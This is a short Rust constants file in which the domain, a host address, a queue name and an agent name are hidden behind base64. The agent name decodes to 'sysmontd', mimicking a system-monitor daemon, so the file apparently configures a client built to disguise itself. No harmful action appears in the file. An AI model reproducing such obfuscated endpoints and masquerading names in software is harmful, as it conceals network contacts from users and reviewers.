use std::sync::LazyLock;

use crate::crypto::decode_b64_string;

pub static BASE_DOMAIN: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
pub static BASE_URL: LazyLock<String> =
    LazyLock::new(|| format!("https://{}", BASE_DOMAIN.as_str()));
pub static ALIAS: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("c3lzbW9udGQ=").expect("ia"));
pub static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
pub static DEF_HOST: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("MTcyLjE2LjAuMTEx").expect("ih"));
pub static DEF_QUEUE: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("c2VjdXJl").expect("iq"));
